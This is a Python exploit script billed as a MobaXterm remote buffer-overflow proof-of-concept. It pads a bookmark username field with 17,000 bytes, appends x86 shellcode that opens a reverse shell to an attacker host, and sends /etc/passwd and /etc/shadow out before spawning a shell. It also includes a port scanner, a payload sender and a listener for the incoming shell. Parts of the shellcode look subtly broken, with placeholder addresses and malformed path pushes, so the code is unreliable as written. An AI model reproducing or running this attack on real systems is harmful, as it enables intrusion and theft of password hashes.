import socket
import sys
sys.getdefaultencoding()  # Force UTF-8 globally
import sys
import time

def generate_payload(ip, port, username):
    # Convert IP to hexadecimal (e.g., 192.168.1.88 → \xc0\xa8\x01\x58)
    ip_hex = "\\x" + "\\x".join(f"{int(octet):02X}" for octet in ip.split("."))
    
    # Convert port to hexadecimal (e.g., 31337 → \x7a\x69)
    #port_hex = "\\x" + "\\x".join(f"{int(port) >> 8:02X}", f"{int(port) & 0xff:02X}")

    port_hex = "\\x" + "\\x".join([
    f"{int(port) >> 8:02X}",  # High byte
    f"{int(port) & 0xff:02X}"  # Low byte
    ])
    
    # Linux x86 shellcode template (RCE + Exfiltration of /etc/passwd and /etc/shadow)
    shellcode = (
        # Reverse shell setup
        "\x6a\x66",          # push $0x66 (socketcall)
        "\x58",              # pop %eax
        "\x6a\x01",          # push $0x1 (sys_socket)
        "\x5b",              # pop %ebx
        "\x6a\x02",          # push $0x2 (AF_INET)
        "\x52",              # push %edx
        "\x6a\x01",          # push $0x1 (SOCK_STREAM)
        "\x6a\x02",          # push $0x2
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80",          # int $0x80

        # Connect to attacker's IP/port
        "\x6a\x66",          # push $0x66 (socketcall)
        "\x58",              # pop %eax
        "\x6a\x03",          # push $0x3 (sys_connect)
        "\x5b",              # pop %ebx
        "\x68" + ip_hex,     # push attacker's IP
        "\x66\x68" + port_hex,  # push attacker's port
        "\x66\x6a\x02",      # push $0x2 (AF_INET)
        "\x89\xe1",          # mov %esp,%ecx
        "\x6a\x10",          # push $0x10 (sockaddr size)
        "\x51",              # push %ecx
        "\x52",             # push %edx
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80",          # int $0x80

        # Read /etc/passwd and send to attacker
        "\x6a\x05",          # push $0x5 (sys_open)
        "\x58",              # pop %eax
        "\x68\x2f\x70\x61",  # push "/pas"
        "\x68\x73\x73\x77",  # push "ssw"
        "\x68\x64\x2f\x65",  # push "d/e"
        "\x68\x74\x63\x2f",  # push "tc/"
        "\x89\xe3",          # mov %esp,%ebx
        "\x52",              # push %edx
        "\x6a\x00",          # push $0x0 (O_RDONLY)
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80",          # int $0x80

        # Read file contents (/etc/passwd)
        "\x6a\x03",         # push $0x3 (sys_read)
        "\x58",              # pop %eax
        "\x52",              # push %edx
        "\x68\x10\x00\x00\x00",  # push buffer address (e.g., 0x10000000)
        "\x68\x00\x00\x00\x00",  # push buffer size (e.g., 0x100)
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80",          # int $0x80

        # Send /etc/passwd data over socket
        "\x6a\x66",          # push $0x66 (socketcall)
        "\x58",              # pop %eax
        "\x6a\x04",          # push $0x4 (sys_send)
        "\x5b",              # pop %ebx
        "\x52",              # push %edx
        "\x68\x10\x00\x00\x00",  # push buffer address
        "\x68\x00\x00\x00\x00",  # push buffer size
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80",          # int $0x80

        # Read /etc/shadow and send to attacker
        "\x6a\x05",          # push $0x5 (sys_open)
        "\x58",              # pop %eax
        "\x68\x2f\x73\x68",  # push "/sh"
        "\x68\x64\x6f\x77\x2f",  # push "dow/"
        "\x68\x2f\x65\x74\x63",  # push "/etc"
        "\x89\xe3",          # mov %esp,%ebx
        "\x52",              # push %edx
        "\x6a\x00",          # push $0x0 (O_RDONLY)
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80",          # int $0x80

        # Read file contents (/etc/shadow)
        "\x6a\x03",          # push $0x3 (sys_read)
        "\x58",              # pop %eax
        "\x52",              # push %edx
        "\x68\x10\x00\x00\x00",  # push buffer address
        "\x68\x00\x00\x00\x00",  # push buffer size
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80",          # int $0x80

        # Send /etc/shadow data over socket
        "\x6a\x66",          # push $0x66 (socketcall)
        "\x58",              # pop %eax
        "\x6a\x04",          # push $0x4 (sys_send)
        "\x5b",              # pop %ebx
        "\x52",              # push %edx
        "\x68\x10\x00\x00\x00",  # push buffer address
        "\x68\x00\x00\x00\x00",  # push buffer size
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80",          # int $0x80

        # Spawn interactive shell
        "\x6a\x0b",          # push $0xb
        "\x58",              # pop %eax
        "\x99",              # cdq
        "\x52",              # push %edx
        "\x66\x68\x2d\x70",  # push $0x702d
        "\x89\xe1",          # mov %esp,%ecx
        "\x52",              # push %edx
        "\x6a\x68",          # push $0x68
        "\x68\x2f\x62\x69",  # push $0x69622f2f
        "\x6e\x89\xe3",      # mov %esp,%ebx
        "\x52",              # push %edx
        "\x51",              # push %ecx
        "\x53",              # push %ebx
        "\x89\xe1",          # mov %esp,%ecx
        "\xcd\x80"         # int $0x80
    )
    return f"[Bookmarks]\nSpecifyUsername={'A'*17000}{'B'*4}{'C'*4}{'D'*4}{shellcode}"

def send_payload(payload, target_ip, target_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(payload.encode())
            print(f"Payload sent to {target_ip}:{target_port}")
            
            # Check for server response (add this)
            response = s.recv(1024).decode()
            if response:
                print(f"\nServer response: {response}")
            return True
    except Exception as e:
        print(f"Error sending payload: {str(e)}")
        return False

def validate_delivery(target_ip, target_port, attacker_ip, attacker_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('0.0.0.0', attacker_port))  # Fixed binding
            s.listen(1)
            print(f"\nWaiting for reverse shell from {target_ip}...")
            conn, addr = s.accept()
            if addr[0] == target_ip:
                print(f"Reverse shell established from {target_ip}!")
                return True
            else:
                print(f"Unexpected connection from {addr[0]}")
                return False
    except Exception as e:
        print(f"Validation error: {str(e)}")
        return False

def port_scan(target_ip, scan_type, specific_port=None):
    try:
        print(f"\nScanning {target_ip} for open ports...")
        if scan_type == "quick":
            ports = [22, 80, 443, 3389, 8080]
        elif scan_type == "long":
            ports = range(1, 1025)
        elif scan_type == "specific":
            ports = [specific_port]
        else:
            print("Invalid scan type. Skipping scan.")
            return []

        open_ports = []
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    s.connect((target_ip, port))
                    open_ports.append(port)
            except:
                continue

        print(f"\nOpen ports found on {target_ip}: {open_ports}")
        return open_ports

    except Exception as e:
        print(f"Scan error: {str(e)}")
        return []

def main():
    print("\n")
    print("Remote Buffer Overflow by Marcin Jacek Chmiel.")
    print("\n")
    print("-----------------------------------------------")
    print("\n")
    print("This code was originally made as a Mobaxterm exploit Proof-of-Concept.")
    print("The code works by partially overloading memory on target device,") 
    print("then spawning interactive shell and sending passwords to attacker device.")
    print("\n")
    ip = input("Enter attacker's IP address: ").strip()
    
    open_port = input("Open port on attacker device? (y/n): ").lower()
    if open_port != "y":
        print("Warning: Port must be open for reverse shell to work!")
    
    port = input("Enter attacker's port (default: 443): ").strip() or "443"
    username = input("Enter SpecifyUsername value (default: 'hacked'): ").strip() or "hacked"
    
    payload = generate_payload(ip, port, username)
    
    print("\nGenerated payload details:")
    print(f"Target username: {username}")
    print(f"Attacker IP: {ip}")
    print(f"Attacker port: {port}")
    print(f"Payload length: {len(payload)} bytes")
    print("\nPayload preview:")
    print(payload[:100] + "...")  # Show first 100 characters
    
    scan_choice = input("\nScan target for open ports? (quick/long/specific/n): ").lower()
    if scan_choice in ["quick", "long", "specific"]:
        target_ip = input("Enter target server IP to scan: ").strip()
        if scan_choice == "specific":
            specific_port = int(input("Enter specific port to scan: ").strip())
            open_ports = port_scan(target_ip, scan_choice, specific_port)
        else:
            open_ports = port_scan(target_ip, scan_choice)
        if open_ports:
            print(f"\nSuggested target ports: {open_ports}")
    
    send_choice = input("\nSend payload to server? (y/n): ").lower()
    if send_choice == "y":
        target_ip = input("Enter target server IP: ").strip()
        target_port = int(input("Enter target server port: ").strip())
        
        if send_payload(payload, target_ip, target_port):
            print("\nAttempting to validate payload delivery...")
            if validate_delivery(target_ip, target_port, ip, int(port)):
                print("Payload delivery confirmed!")
            else:
                print("Payload delivery failed. Check network/firewall settings.")
    
    save = input("Save to file? (y/n): ").lower() == "y"
    if save:
        with open("payload.txt", "w", encoding="utf-8") as f:
            f.write(payload)

    send_again = input("\nSend payload again? (y/n): ").lower()
    if send_again == "y":
        target_ip = input("Enter target server IP: ").strip()
        target_port = int(input("Enter target server port: ").strip())
        send_payload(payload, target_ip, target_port)

if __name__ == "__main__":
    main()
